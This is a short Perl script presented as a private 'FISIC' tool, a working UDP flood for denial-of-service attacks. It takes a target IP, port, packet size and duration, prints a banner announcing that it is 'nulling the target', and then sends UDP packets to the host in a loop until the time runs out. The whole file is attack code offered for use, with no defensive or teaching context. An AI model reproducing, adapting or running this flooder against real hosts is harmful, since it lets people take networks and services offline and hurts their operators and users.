#!/usr/bin/perl
	
#########################################
#    FISIC   #   PRIVATE   #   TOOLS    #
#########################################
	
use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "CANNOT SOLVE HOSTNAME $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);



print <<EOTEXT;
         
                                       
  .s5SSSs. s.  .s5SSSs.  s.  .s5SSSs.      
  sS       SS. sS     SS SS. sS     SS.     
  sS       S%S sS    `:; S%S sS    `:;     IP: $ip
  SSSs.    S%S `:;;;;.   S%S SS            PORT: $port
  SS       S%S       ;;. S%S SS            PACKETS: $size  
  SS       `:;       `:; `:; SS            TIME: $time
  SS       ;,. .,;   ;,. ;,. SS    ;,.     TYPE: UDP
  :;       ;:' `:;;;;;:' ;:' `:;;;;;:' 
                                       
      
EOTEXT

print "   NULLING THE TARGET $ip " . ($port ? $port : " ") . " WITH " . 
  ($size ? "$size" : "65500") . " PACKETS" . 
  ($time ? " FOR $time SECONDS" : "") . "\n";

print <<EOTEXT;

   STOP NULLING WITH CTRL-C
  
EOTEXT
print "\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}